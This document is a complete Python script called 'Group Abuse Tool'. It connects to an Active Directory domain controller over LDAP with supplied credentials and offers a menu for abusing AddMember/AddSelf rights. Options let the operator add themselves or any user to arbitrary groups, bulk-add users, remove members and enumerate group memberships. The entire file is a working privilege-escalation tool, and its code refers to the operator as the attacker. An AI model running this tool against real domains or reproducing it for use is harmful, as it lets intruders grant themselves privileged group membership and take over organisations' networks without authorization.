#!/usr/bin/env python3
import sys
import re
import socket
import signal
import struct
import ssl
import platform
import ldap3
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_ADD, MODIFY_DELETE, MODIFY_REPLACE
from ldap3.core.exceptions import LDAPBindError
from colorama import Fore, Style, init

init(autoreset=True)


def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║                  Group Abuse Tool                         ║
    ║         Exploit AddMember / AddSelf privileges            ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Running on: {platform.system()} {platform.release()}" + Style.RESET_ALL)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))


def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part:
            return False
    return True


def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)


def check_ip_reachable(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 445))
        sock.close()
        return result == 0
    except Exception:
        return False


def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server  = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn    = Connection(server, user=f"{domain}\\{username}", password=password,
                             authentication=NTLM, auto_bind=True)
        conn.search(base_dn, '(objectClass=domain)', SUBTREE, attributes=['dc'])
        result  = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError:
        return "invalid_credentials"
    except Exception:
        return False


def ldap_connect(dc_ip, domain, username, password):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn   = Connection(server, user=f"{domain}\\{username}", password=password,
                            authentication=NTLM, auto_bind=True)
        return conn
    except Exception as e:
        print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
        return None


def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])


def get_object_dn(conn, base_dn, sam):
    try:
        conn.search(base_dn, f'(sAMAccountName={sam})', SUBTREE,
                    attributes=['distinguishedName', 'objectClass', 'memberOf'])
        return conn.entries[0] if conn.entries else None
    except Exception:
        return None


def get_group_entry(conn, base_dn, group_name):
    try:
        conn.search(base_dn,
                    f'(|(sAMAccountName={group_name})(cn={group_name}))',
                    SUBTREE,
                    attributes=['distinguishedName', 'member', 'cn', 'sAMAccountName', 'groupType'])
        return conn.entries[0] if conn.entries else None
    except Exception:
        return None


def list_group_members(conn, base_dn, group_name):
    print(Fore.CYAN + f"\n[*] Listing members of '{group_name}'..." + Style.RESET_ALL)
    group = get_group_entry(conn, base_dn, group_name)
    if not group:
        print(Fore.RED + f"[-] Group '{group_name}' not found!" + Style.RESET_ALL)
        return

    group_dn = str(group.distinguishedName)
    print(Fore.YELLOW + f"[*] Group DN: {group_dn}" + Style.RESET_ALL)

    attrs   = group.entry_attributes_as_dict
    members = attrs.get('member', [])

    if not members:
        print(Fore.YELLOW + "[*] Group has no members." + Style.RESET_ALL)
        return

    print(Fore.GREEN + f"[+] Members ({len(members)}):" + Style.RESET_ALL)
    for m in members:
        cn = str(m).split(',')[0].replace('CN=', '').replace('cn=', '')
        print(Fore.WHITE + f"    - {cn}  ({m})" + Style.RESET_ALL)


def search_groups(conn, base_dn, keyword):
    print(Fore.CYAN + f"\n[*] Searching for groups containing '{keyword}'..." + Style.RESET_ALL)
    try:
        conn.search(base_dn,
                    f'(&(objectClass=group)(|(cn=*{keyword}*)(sAMAccountName=*{keyword}*)))',
                    SUBTREE,
                    attributes=['cn', 'sAMAccountName', 'distinguishedName', 'groupType'])
        if not conn.entries:
            print(Fore.RED + "[-] No groups found!" + Style.RESET_ALL)
            return
        print(Fore.GREEN + f"[+] Found {len(conn.entries)} group(s):" + Style.RESET_ALL)
        for entry in conn.entries:
            attrs    = entry.entry_attributes_as_dict
            cn       = attrs.get('cn', ['?'])[0]
            sam      = attrs.get('sAMAccountName', ['?'])[0]
            dn       = str(entry.distinguishedName)
            print(Fore.WHITE + f"    CN: {cn}  |  SAM: {sam}" + Style.RESET_ALL)
            print(Fore.WHITE + f"        DN: {dn}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Search error: {e}" + Style.RESET_ALL)


def show_user_groups(conn, base_dn, target_sam):
    print(Fore.CYAN + f"\n[*] Groups of user '{target_sam}'..." + Style.RESET_ALL)
    entry = get_object_dn(conn, base_dn, target_sam)
    if not entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return
    attrs   = entry.entry_attributes_as_dict
    groups  = attrs.get('memberOf', [])
    if not groups:
        print(Fore.YELLOW + "[*] User is not a member of any group." + Style.RESET_ALL)
        return
    print(Fore.GREEN + f"[+] Member of {len(groups)} group(s):" + Style.RESET_ALL)
    for g in groups:
        cn = str(g).split(',')[0].replace('CN=', '').replace('cn=', '')
        print(Fore.WHITE + f"    - {cn}" + Style.RESET_ALL)


def abuse_add_member(conn, base_dn, target_sam, group_name):
    print(Fore.CYAN + f"\n[*] AddMember: Adding '{target_sam}' to '{group_name}'" + Style.RESET_ALL)

    user_entry  = get_object_dn(conn, base_dn, target_sam)
    group_entry = get_group_entry(conn, base_dn, group_name)

    if not user_entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return
    if not group_entry:
        print(Fore.RED + f"[-] Group '{group_name}' not found!" + Style.RESET_ALL)
        return

    user_dn  = str(user_entry.distinguishedName)
    group_dn = str(group_entry.distinguishedName)

    attrs   = group_entry.entry_attributes_as_dict
    members = [str(m) for m in attrs.get('member', [])]
    if user_dn in members:
        print(Fore.YELLOW + f"[*] '{target_sam}' is already a member of '{group_name}'!" + Style.RESET_ALL)
        return

    result = conn.modify(group_dn, {'member': [(MODIFY_ADD, [user_dn])]})
    if result:
        print(Fore.GREEN + f"[+] Successfully added '{target_sam}' to '{group_name}'!" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] User DN : {user_dn}" + Style.RESET_ALL)
        print(Fore.GREEN + f"[+] Group DN: {group_dn}" + Style.RESET_ALL)
    else:
        err = conn.result.get('description', 'unknown')
        msg = conn.result.get('message', '')
        print(Fore.RED + f"[-] AddMember failed: {err}" + Style.RESET_ALL)
        if msg:
            print(Fore.RED + f"[-] Details: {msg}" + Style.RESET_ALL)


def abuse_add_self(conn, base_dn, attacker_sam, group_name):
    print(Fore.CYAN + f"\n[*] AddSelf: Adding self '{attacker_sam}' to '{group_name}'" + Style.RESET_ALL)
    abuse_add_member(conn, base_dn, attacker_sam, group_name)


def abuse_remove_member(conn, base_dn, target_sam, group_name):
    print(Fore.CYAN + f"\n[*] RemoveMember: Removing '{target_sam}' from '{group_name}'" + Style.RESET_ALL)

    user_entry  = get_object_dn(conn, base_dn, target_sam)
    group_entry = get_group_entry(conn, base_dn, group_name)

    if not user_entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return
    if not group_entry:
        print(Fore.RED + f"[-] Group '{group_name}' not found!" + Style.RESET_ALL)
        return

    user_dn  = str(user_entry.distinguishedName)
    group_dn = str(group_entry.distinguishedName)

    result = conn.modify(group_dn, {'member': [(MODIFY_DELETE, [user_dn])]})
    if result:
        print(Fore.GREEN + f"[+] Successfully removed '{target_sam}' from '{group_name}'!" + Style.RESET_ALL)
    else:
        err = conn.result.get('description', 'unknown')
        print(Fore.RED + f"[-] RemoveMember failed: {err}" + Style.RESET_ALL)


def abuse_add_multiple(conn, base_dn, group_name):
    print(Fore.CYAN + f"\n[*] AddMultiple: Adding multiple users to '{group_name}'" + Style.RESET_ALL)
    print(Fore.YELLOW + "[*] Enter usernames one per line, empty line to finish:" + Style.RESET_ALL)

    users = []
    while True:
        try:
            user = input(Fore.CYAN + "    Username: " + Style.RESET_ALL).strip()
            if not user:
                break
            users.append(user)
        except KeyboardInterrupt:
            break

    if not users:
        print(Fore.YELLOW + "[*] No users entered." + Style.RESET_ALL)
        return

    group_entry = get_group_entry(conn, base_dn, group_name)
    if not group_entry:
        print(Fore.RED + f"[-] Group '{group_name}' not found!" + Style.RESET_ALL)
        return

    group_dn = str(group_entry.distinguishedName)
    success  = 0
    failed   = 0

    for sam in users:
        user_entry = get_object_dn(conn, base_dn, sam)
        if not user_entry:
            print(Fore.RED + f"  [-] User '{sam}' not found!" + Style.RESET_ALL)
            failed += 1
            continue
        user_dn = str(user_entry.distinguishedName)
        result  = conn.modify(group_dn, {'member': [(MODIFY_ADD, [user_dn])]})
        if result:
            print(Fore.GREEN + f"  [+] Added '{sam}'" + Style.RESET_ALL)
            success += 1
        else:
            err = conn.result.get('description', 'unknown')
            print(Fore.RED + f"  [-] Failed '{sam}': {err}" + Style.RESET_ALL)
            failed += 1

    print(Fore.YELLOW + f"\n[*] Done: {success} added, {failed} failed." + Style.RESET_ALL)


def main_menu(conn, base_dn, attacker_sam):
    while True:
        print(Fore.CYAN + "\n" + "=" * 62 + Style.RESET_ALL)
        print(Fore.CYAN + "  [ Group Abuse - AddMember / AddSelf ]" + Style.RESET_ALL)
        print(Fore.CYAN + "=" * 62 + Style.RESET_ALL)
        print(Fore.WHITE + f"""
    1.  AddSelf          - Add yourself to a group

    2.  AddMember        - Add any user to a group

    3.  AddMultiple      - Add multiple users to a group

    4.  RemoveMember     - Remove a user from a group

    5.  ListMembers      - List all members of a group

    6.  SearchGroups     - Search for groups by name

    7.  MyGroups         - Show your current group memberships

    8.  UserGroups       - Show another user's group memberships
    """)
        print(Fore.RED   + "    0.  Exit")
        print(Fore.CYAN  + "=" * 62 + Style.RESET_ALL)

        choice = get_input(Fore.CYAN + "[?] Choice: " + Style.RESET_ALL)

        if choice == '0':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)

        elif choice == '1':
            group = get_input(Fore.CYAN + "[?] Enter group name: " + Style.RESET_ALL)
            abuse_add_self(conn, base_dn, attacker_sam, group)

        elif choice == '2':
            target = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
            group  = get_input(Fore.CYAN + "[?] Enter group name    : " + Style.RESET_ALL)
            abuse_add_member(conn, base_dn, target, group)

        elif choice == '3':
            group = get_input(Fore.CYAN + "[?] Enter group name: " + Style.RESET_ALL)
            abuse_add_multiple(conn, base_dn, group)

        elif choice == '4':
            target = get_input(Fore.CYAN + "[?] Enter username to remove: " + Style.RESET_ALL)
            group  = get_input(Fore.CYAN + "[?] Enter group name        : " + Style.RESET_ALL)
            abuse_remove_member(conn, base_dn, target, group)

        elif choice == '5':
            group = get_input(Fore.CYAN + "[?] Enter group name: " + Style.RESET_ALL)
            list_group_members(conn, base_dn, group)

        elif choice == '6':
            keyword = get_input(Fore.CYAN + "[?] Enter search keyword: " + Style.RESET_ALL)
            search_groups(conn, base_dn, keyword)

        elif choice == '7':
            show_user_groups(conn, base_dn, attacker_sam)

        elif choice == '8':
            target = get_input(Fore.CYAN + "[?] Enter username: " + Style.RESET_ALL)
            show_user_groups(conn, base_dn, target)

        else:
            print(Fore.RED + "[!] Invalid choice!" + Style.RESET_ALL)


if __name__ == '__main__':
    banner()

    dc_ip = get_input(
        Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL,
        validate_ip, "Invalid IP! Example: 192.168.1.1"
    )
    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain   = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL,
                         validate_domain, "Invalid domain! Example: cs.org")
    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials and domain..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Domain '{domain}' verified!" + Style.RESET_ALL)

    print(Fore.YELLOW + "\n[*] Connecting to LDAP..." + Style.RESET_ALL)
    conn = ldap_connect(dc_ip, domain, username, password)
    if not conn:
        sys.exit(1)
    print(Fore.GREEN + "[+] LDAP connected!" + Style.RESET_ALL)

    base_dn = get_base_dn(domain)

    main_menu(conn, base_dn, username)
